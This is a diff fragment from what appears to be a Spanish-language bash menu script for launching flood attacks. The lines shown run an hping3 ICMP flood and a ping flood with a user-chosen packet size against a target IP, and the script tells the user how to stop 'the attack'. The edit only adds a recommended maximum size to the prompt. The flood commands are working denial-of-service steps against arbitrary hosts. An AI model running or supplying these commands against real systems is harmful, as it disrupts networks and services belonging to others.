@@ -93,7 +93,7 @@ EOF
         hping3 --icmp $ip --flood
         ;;
       6)
-        read -p "¿Cuál es el tamaño de los bytes que quieres enviar?: " tam
+        read -p "¿Cuál es el tamaño de los bytes que quieres enviar? (máx recomendado: 65500): " tam
         echo "PRESIONA CTRL+C PARA DETENER EL ATAQUE EN CUALQUIER MOMENTO!!!!."
         ping -s $tam -f $ip
         ;;
